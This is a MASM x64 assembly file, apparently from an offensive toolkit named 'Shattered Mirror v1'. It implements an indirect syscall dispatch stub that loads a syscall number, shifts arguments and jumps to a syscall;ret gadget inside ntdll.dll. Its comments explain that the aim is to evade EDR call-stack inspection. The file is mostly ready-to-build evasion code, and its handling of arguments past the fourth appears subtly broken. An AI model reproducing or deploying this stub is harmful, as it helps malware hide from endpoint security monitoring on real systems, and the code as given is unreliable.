;=============================================================================
; Shattered Mirror v1 — Indirect Syscall Dispatch Stub (MASM x64)
;
; This is the heart of the evasion. When any wrapper calls SyscallDispatch,
; execution flows here. We:
;   1. Save the SYSCALL_ENTRY pointer
;   2. Extract SSN → load into EAX
;   3. Extract gadget address → prepare for JMP
;   4. Shift all remaining args into correct NT positions
;   5. mov r10, rcx (kernel expects 1st arg in r10)
;   6. JMP to the syscall;ret gadget INSIDE ntdll.dll
;
; To the EDR:
;   - The syscall instruction executes from ntdll.dll address space (backed)
;   - The return address on the stack points back to our caller (legit)
;   - The call stack shows: our_code → ntdll_gadget → kernel
;   - No unbacked executable memory in the chain
;
; Calling convention for SyscallDispatch:
;   RCX = PSYSCALL_ENTRY (our metadata — SSN + gadget addr)
;   RDX = 1st NT arg
;   R8  = 2nd NT arg
;   R9  = 3rd NT arg
;   [RSP+0x28..] = 4th+ NT args (already on stack from caller)
;
; We need to shift: RDX→RCX, R8→RDX, R9→R8, [RSP+0x28]→R9
; Then set R10=RCX (new 1st arg), EAX=SSN, JMP gadget
;
; Build: ml64.exe /c /Fo IndirectSyscalls.obj IndirectSyscalls.asm
;=============================================================================

.data
    ; Offsets into SYSCALL_ENTRY struct
    ; struct { DWORD dwHash; DWORD dwSSN; PVOID pSyscallGadget; PVOID pFunctionAddr; BOOL bResolved; }
    ENTRY_SSN_OFFSET     EQU 4     ; offsetof(SYSCALL_ENTRY, dwSSN)
    ENTRY_GADGET_OFFSET  EQU 8     ; offsetof(SYSCALL_ENTRY, pSyscallGadget) [8 on x64, aligned]

.code

;-----------------------------------------------------------------------------
; extern "C" NTSTATUS SyscallDispatch(PSYSCALL_ENTRY pEntry, ...)
;
; Stack on entry (caller used CALL, so return addr is at [RSP]):
;   [RSP]      = return address
;   [RSP+0x08] = shadow space (RCX home)   — pEntry
;   [RSP+0x10] = shadow space (RDX home)   — NT arg 1
;   [RSP+0x18] = shadow space (R8 home)    — NT arg 2
;   [RSP+0x20] = shadow space (R9 home)    — NT arg 3
;   [RSP+0x28] = 5th arg                   — NT arg 4 (stack arg)
;   [RSP+0x30] = 6th arg                   — NT arg 5
;   ... etc
;-----------------------------------------------------------------------------

SyscallDispatch PROC

    ; Save pEntry, we need it for SSN and gadget
    mov     rax, rcx                        ; rax = PSYSCALL_ENTRY

    ; Load SSN into eax (32-bit, upper 32 zeroed automatically)
    mov     r11, rax                        ; preserve entry ptr in r11
    mov     eax, DWORD PTR [r11 + ENTRY_SSN_OFFSET]   ; eax = SSN

    ; Load gadget address (the syscall;ret inside ntdll)
    mov     r11, QWORD PTR [r11 + ENTRY_GADGET_OFFSET] ; r11 = gadget addr

    ; Shift arguments: NT function expects args in RCX,RDX,R8,R9,[stack]
    ; Currently: RDX=arg1, R8=arg2, R9=arg3, [RSP+0x28]=arg4
    ; We need:   RCX=arg1, RDX=arg2, R8=arg3, R9=arg4
    
    mov     rcx, rdx                        ; arg1 → RCX
    mov     rdx, r8                         ; arg2 → RDX
    mov     r8,  r9                         ; arg3 → R8
    mov     r9,  QWORD PTR [rsp + 28h]     ; arg4 → R9 (from stack)

    ; NT syscall convention: first arg goes in R10 (kernel swaps R10↔RCX)
    mov     r10, rcx                        ; r10 = first arg (kernel convention)

    ; JMP to the gadget — this executes:
    ;   syscall    (SSN in EAX, args in r10/rdx/r8/r9/stack)
    ;   ret        (returns to our caller's return address)
    ;
    ; The RET inside the gadget will pop our caller's return address,
    ; returning control directly to whoever called our wrapper.
    jmp     r11

SyscallDispatch ENDP

END
